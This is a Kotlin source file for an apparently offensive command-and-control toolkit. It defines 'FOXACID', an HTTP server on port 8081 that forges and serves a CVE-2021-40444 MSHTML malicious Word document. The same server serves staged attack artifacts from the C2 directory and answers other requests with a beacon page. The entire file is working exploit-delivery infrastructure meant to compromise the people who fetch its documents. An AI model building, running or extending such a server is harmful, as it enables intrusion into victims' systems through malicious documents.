package com.projectzerodays.quantumcli.c2

import com.projectzerodays.quantumcli.ops.Artifacts
import fi.iki.elonen.NanoHTTPD
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import org.json.JSONObject
import java.io.File
import java.net.URLDecoder

/**
 * FOXACID — exploit-serving HTTP server on :8081 (Python FoxAcid parity).
 *
 *   GET /maldoc.docx  (alias /x.doc) — streams the forged CVE-2021-40444
 *                     MSHTML OOXML maldoc (forged once, then cached, like the
 *                     Python server which stages it at bind time)
 *   GET /f/<name>     — streams any staged artifact from C2State.qcliDir as
 *                     application/octet-stream
 *   GET /anything     — q beacon page ("q"), Python parity
 *
 * Every serve is audited. This listener is independent of QuantServerManager —
 * it owns its own bind/stop lifecycle.
 */
object FoxAcid {

    private var server: Server? = null

    @Volatile
    var boundPort: Int = 8081
        private set

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()

    fun start(port: Int = 8081): Boolean {
        stop()
        return try {
            val s = Server(port)
            s.start(NanoHTTPD.SOCKET_READ_TIMEOUT, true)
            server = s
            boundPort = port
            _running.value = true
            C2State.audit("C2", "FOXACID serving maldoc on :$port/maldoc.docx (+ /f/<name>)")
            true
        } catch (e: Exception) {
            C2State.audit("ERR", "FOXACID bind :$port failed — ${e.message}")
            false
        }
    }

    fun stop() {
        server?.stop()
        server = null
        if (_running.value) C2State.audit("C2", "FOXACID stopped")
        _running.value = false
    }

    fun status(): JSONObject = JSONObject()
        .put("running", _running.value)
        .put("port", boundPort)
        .put("maldoc", "/maldoc.docx")
        .put("files", "/f/<name>")

    private class Server(port: Int) : NanoHTTPD(port) {

        @Volatile
        private var cachedMaldoc: File? = null

        override fun serve(session: IHTTPSession): Response {
            val uri = session.uri ?: "/"
            return when {
                uri.startsWith("/maldoc.docx") || uri.startsWith("/x.doc") ->
                    serveMaldoc(session)

                uri.startsWith("/f/") -> serveQcliFile(session, uri.removePrefix("/f/"))

                else ->
                    newFixedLengthResponse(
                        Response.Status.OK, "text/html", "<html><body>q</body></html>"
                    )
            }
        }

        /** Forge (once) and stream the CVE-2021-40444 maldoc. */
        private fun serveMaldoc(session: IHTTPSession): Response {
            var fn = cachedMaldoc
            if (fn == null || !fn.isFile) {
                // Artifacts.mshtmlMaldoc forges a real OOXML zip under qcli/
                // and audits it; returns {"staged": <abs path>, ...}.
                val staged = Artifacts.mshtmlMaldoc(null)
                fn = File(staged.optString("staged"))
                if (!fn.isFile) {
                    C2State.audit("ERR", "FOXACID maldoc forge failed")
                    return newFixedLengthResponse(
                        Response.Status.INTERNAL_ERROR, "text/plain", "maldoc forge failed"
                    )
                }
                cachedMaldoc = fn
            }
            val bytes = fn.readBytes()
            C2State.audit(
                "C2",
                "FOXACID ${session.remoteIpAddress} /maldoc.docx -> ${fn.name} (${bytes.size}B)"
            )
            return newFixedLengthResponse(
                Response.Status.OK,
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                java.io.ByteArrayInputStream(bytes),
                bytes.size.toLong()
            )
        }

        /** GET /f/<name> — stream a staged artifact from qcli/ (octet-stream). */
        private fun serveQcliFile(session: IHTTPSession, rawName: String): Response {
            val name = try {
                URLDecoder.decode(rawName.trim(), "UTF-8")
            } catch (e: Exception) {
                rawName.trim()
            }
            if (name.isBlank() || name.contains('/') || name.contains('\\') || name.contains("..")) {
                C2State.audit("ERR", "FOXACID ${session.remoteIpAddress} rejected file request '$rawName'")
                return newFixedLengthResponse(Response.Status.FORBIDDEN, "text/plain", "invalid name")
            }
            val root = C2State.qcliDir.canonicalFile
            val f = File(root, name)
            if (f.parentFile?.canonicalFile != root || !f.isFile) {
                return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "not found")
            }
            val bytes = f.readBytes()
            C2State.audit("C2", "FOXACID ${session.remoteIpAddress} /f/$name -> ${bytes.size}B")
            return newFixedLengthResponse(
                Response.Status.OK,
                "application/octet-stream",
                java.io.ByteArrayInputStream(bytes),
                bytes.size.toLong()
            )
        }
    }
}
